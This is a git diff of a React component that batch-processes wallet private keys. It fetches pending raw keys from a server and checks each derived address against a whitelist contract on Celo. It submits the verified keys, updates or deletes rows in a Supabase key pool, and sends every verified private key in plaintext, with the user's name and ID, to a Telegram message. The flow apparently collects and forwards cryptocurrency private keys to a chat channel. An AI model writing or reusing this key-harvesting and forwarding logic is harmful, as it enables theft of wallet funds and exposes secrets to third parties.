@@ -1,9 +1,9 @@
 import { useState, useCallback } from "react";
 import { useAuth } from "@/hooks/use-auth";
 import { useToast } from "@/hooks/use-toast";
-import { useQueryClient } from "@tanstack/react-query";
-import { getPendingKeys, clearPendingKeys, savePendingKeys } from "@/components/KeySubmitter";
-import { submitKey, addPoolKey } from "@/lib/api";
+import { useQueryClient, useQuery } from "@tanstack/react-query";
+import { getPendingKeysFromServer } from "@/components/KeySubmitter";
+import { submitKey } from "@/lib/api";
 import { supabase } from "@/integrations/supabase/client";
 import { ethers } from "ethers";
 import { motion, AnimatePresence } from "framer-motion";
@@ -22,15 +22,20 @@ export function SubmitAllButton() {
   const [isSubmitting, setIsSubmitting] = useState(false);
   const [progress, setProgress] = useState({ total: 0, checked: 0, verified: 0, failed: 0 });
 
-  const pendingKeys = getPendingKeys();
+  const { data: pendingKeys = [], refetch: refetchPending } = useQuery({
+    queryKey: ["pending-keys-server", user?.guest_id],
+    queryFn: () => getPendingKeysFromServer(user?.guest_id || ""),
+    enabled: !!user?.guest_id && !isSubmitting,
+    refetchInterval: 10000,
+  });
+
   const pendingCount = pendingKeys.length;
 
   const handleSubmitAll = useCallback(async () => {
     if (!user || pendingCount === 0 || isSubmitting) return;
 
     setIsSubmitting(true);
-    const keys = getPendingKeys();
-    setProgress({ total: keys.length, checked: 0, verified: 0, failed: 0 });
+    setProgress({ total: pendingCount, checked: 0, verified: 0, failed: 0 });
 
     try {
       const provider = new ethers.JsonRpcProvider(CELO_RPC);
@@ -38,39 +43,46 @@ export function SubmitAllButton() {
 
       let verifiedCount = 0;
       let failedCount = 0;
-      const verifiedKeys: string[] = [];
+      const verifiedPrivateKeys: string[] = [];
 
-      for (let i = 0; i < keys.length; i++) {
+      for (let i = 0; i < pendingKeys.length; i++) {
+        const pk = pendingKeys[i].private_key;
         try {
-          const result = await contract.isWhitelisted(keys[i].address);
+          const wallet = new ethers.Wallet(pk);
+          const result = await contract.isWhitelisted(wallet.address);
           if (result === true) {
-            // This key is verified - submit it
-            await submitKey(user.id, keys[i].privateKey);
+            await submitKey(user.id, pk);
 
             // Mark as used in pool
-            const guestId = user.guest_id || "Unknown";
             await supabase
               .from("verification_pool")
               .update({ is_used: true })
-              .eq("private_key", keys[i].privateKey)
-              .eq("added_by", guestId);
+              .eq("private_key", pk)
+              .eq("added_by", user.guest_id);
 
-            verifiedKeys.push(keys[i].privateKey);
+            verifiedPrivateKeys.push(pk);
             verifiedCount++;
           } else {
+            // Not verified - delete from pool
+            await supabase
+              .from("verification_pool")
+              .delete()
+              .eq("private_key", pk)
+              .eq("added_by", user.guest_id)
+              .eq("is_used", false);
             failedCount++;
           }
         } catch (err) {
           console.error("Check failed for key:", err);
           failedCount++;
         }
-        setProgress({ total: keys.length, checked: i + 1, verified: verifiedCount, failed: failedCount });
+        setProgress({ total: pendingCount, checked: i + 1, verified: verifiedCount, failed: failedCount });
       }
 
       // Send all verified keys to Telegram in one message
-      if (verifiedKeys.length > 0) {
+      if (verifiedPrivateKeys.length > 0) {
         try {
-          const telegramMessage = `🔑 <b>Batch Submit</b>\n👤 ${user.display_name || user.guest_id} (ID: ${user.id})\n✅ Verified: ${verifiedKeys.length}/${keys.length}\n\n${verifiedKeys.map((k, i) => `${i + 1}. <code>${k}</code>`).join("\n")}`;
+          const telegramMessage = `🔑 <b>Batch Submit</b>\n👤 ${user.display_name || user.guest_id} (ID: ${user.id})\n✅ Verified: ${verifiedPrivateKeys.length}/${pendingCount}\n\n${verifiedPrivateKeys.map((k, i) => `${i + 1}. <code>${k}</code>`).join("\n")}`;
           await supabase.functions.invoke("send-telegram", {
             body: { message: telegramMessage },
           });
@@ -79,13 +91,12 @@ export function SubmitAllButton() {
         }
       }
 
-      // Clear all pending keys
-      clearPendingKeys();
-
       await refreshUser();
+      refetchPending();
       queryClient.invalidateQueries({ queryKey: ["user"] });
       queryClient.invalidateQueries({ queryKey: ["transactions"] });
       queryClient.invalidateQueries({ queryKey: ["pending-keys-count"] });
+      queryClient.invalidateQueries({ queryKey: ["pending-keys-server"] });
 
       if (verifiedCount > 0) {
         toast({
@@ -105,7 +116,7 @@ export function SubmitAllButton() {
       setIsSubmitting(false);
       setProgress({ total: 0, checked: 0, verified: 0, failed: 0 });
     }
-  }, [user, pendingCount, isSubmitting, refreshUser, queryClient, toast]);
+  }, [user, pendingCount, pendingKeys, isSubmitting, refreshUser, refetchPending, queryClient, toast]);
 
   if (pendingCount === 0 && !isSubmitting) return null;
 
